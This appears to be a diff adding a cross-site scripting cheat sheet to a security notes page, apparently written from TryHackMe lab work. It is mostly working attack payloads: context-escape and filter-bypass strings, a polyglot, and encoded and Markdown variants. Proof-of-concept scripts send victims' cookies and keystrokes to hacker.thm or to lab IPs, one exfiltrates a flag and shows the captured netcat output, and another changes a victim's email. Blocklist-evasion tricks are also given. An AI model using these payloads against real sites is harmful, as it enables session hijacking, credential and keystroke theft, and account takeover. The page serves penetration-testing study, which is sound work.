@@ -3,3 +3,179 @@ title: Cross Site Scripting
 description:  XSS
 ---
 
+## Context
+An injected XSS payload will most likely find its way within one of the following
+- Between HTML tags
+- Within HTML tags
+- Inside JavaScript
+When XSS happens between HTML tags, the attacker can run <script>alert(document.cookie)</script>.
+
+However, when the injection is within an HTML tag, we need to end the HTML tag to give the script a turn to load. Consequently, we might adapt our payload to
+```html
+><script>alert(document.cookie)</script>
+    or
+"><script>alert(document.cookie)</script> 
+```
+or something similar that would fit in the context.
+
+We might need to terminate the script to run the injected one if we can inject our XSS within an existing JavaScript. For instance, we can start with `</script>` to end the script and continue from there. 
+
+If your code is within a JavaScript string, you can close the string with `'`, complete the command with a semicolon, execute your command, and comment out the rest of the line with `//`. 
+
+You can try something like this `';alert(document.cookie)//`
+
+This example should give you some ideas to escape the context you start from. Being aware of the context where your XXS payload is executing is very important for the successful execution of the payload.
+
+## Common Techniques
+
+1. Name is displayed on screen in HTML code 
+```html
+<script>alert('XSS');</script>
+```
+2. Name is displayed inside of a Text Input 
+```html
+"><script>alert('Hacker-One-Research');</script>
+```
+- The important part of the payload is the `">` which closes the value parameter and then closes the input tag.
+
+3. Name is displayed inside of a textarea 
+```html
+ </textarea><script>alert('XSS');</script>
+```
+- We'll have to escape the textarea tag a little differently from the input one (in Level Two) 
+The important part of the above payload is `</textarea>`, which causes the textarea element to close so the script will run.
+
+4. Name is displayed on page, but injected inside JS code 
+```html
+';alert('XSS');//
+```
+- The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.
+
+5. The word "script" is filtered for security 
+i.e. `Hello, <>alert('XSS');`
+```html
+<sscriptcript>alert('XSS');</sscriptcript>
+```
+
+6. `<` and `>` are filtered out for security 
+```html
+/images/cat.jpg" onload="alert('XSS');
+```
+
+## Polygots
+
+An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+```
+- You could have used the above polyglot on all previous examples, and it would have executed the code successfully.
+
+## Encoding XSS
+This is an example of encoding an XSS payload into a URL
+
+- Payload: `?k304=y <img src=copyparty onerror=alert(1)>`
+
+```html
+?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
+```
+
+## Markdown XSS
+This is an example of XSS using Markdown
+
+- Payload: `javascript:alert('XSS')` is converted to hex 
+
+```html
+[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
+```
+
+## iFrame
+```html
+<iframe src="javascript:alert(`xss`)"> 
+```
+
+## POCs
+
+### Session Stealing
+Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
+```html
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+```
+### Key Logger
+The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
+```html
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+```
+### Business Logic
+This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
+```html
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
+### XSS Reverse Shell
+```html
+'"><script>
+fetch('http://127.0.0.1:8080/flag.txt')
+.then(response => response.text())
+.then(data => {
+fetch('http://10.13.63.198:1223/?flag=' + encodeURIComponent(data));
+});
+</script>
+```
+```bash
+└─$ nc -lnvp 1223      
+listening on [any] 1223 ...
+connect to [10.13.63.198] from (UNKNOWN) [10.10.192.196] 43598
+GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
+Host: 10.13.63.198:1223
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
+Accept: */*
+Origin: http://127.0.0.1:8080
+Referer: http://127.0.0.1:8080/
+Accept-Encoding: gzip, deflate
+```
+
+### Cookie Stealing
+```html
+a. </textarea><script>fetch('http://10.6.57.139:1223?cookie=' + btoa(document.cookie) );</script>
+```
+- The `</textarea>` tag closes the text area field.
+- The `<script>` tag opens an area for us to write JavaScript.
+- The `fetch()` command makes an HTTP request.
+- `URL_OR_IP` is either the request catcher URL, or the attacker IP address.
+- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
+- `?cookie=` is the query string containing the victim’s cookies.
+- `btoa()` command base64 encodes the victim’s cookies.
+- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
+- `</script>` closes the JavaScript code block.
+
+## Evasion
+If XSS payloads are blocked based on specific blocklists, there are various tricks for evasion. For instance, a horizontal tab, a new line, or a carriage return can break up the payload and evade the detection engines.
+- Horizontal tab (TAB) is 9 in hexadecimal representation
+- New line (LF) is A in hexadecimal representation
+- Carriage return (CR) is D in hexadecimal representation
+	
+Consequently, based on the XSS Filter Evasion Cheat Sheet, we can break up the payload. 
+`<IMG SRC="javascript:alert('XSS');">` in various ways:
+```html
+<IMGSRC="jav&#x09;ascript:alert('XSS');">
+<IMGSRC="jav&#x0A;ascript:alert('XSS');">
+<IMGSRC="jav&#x0D;ascript:alert('XSS');">
+```
+### XSS Filter Evasion Cheat Sheet
+- [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
+
+There are hundreds of evasion techniques and the choice would depend on the target security and require trial and error before achieving a successful outcome.
+
+## Tools
+
+- [XSS Payloads List](https://github.com/payloadbox/xss-payload-list)
+- [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)
+
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
+
+A popular tool for Blind XSS attacks is XSS Hunter Express. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
+- [https://github.com/mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
+
+## XSS Mindmap
+
+![Image](/mindmap.png)
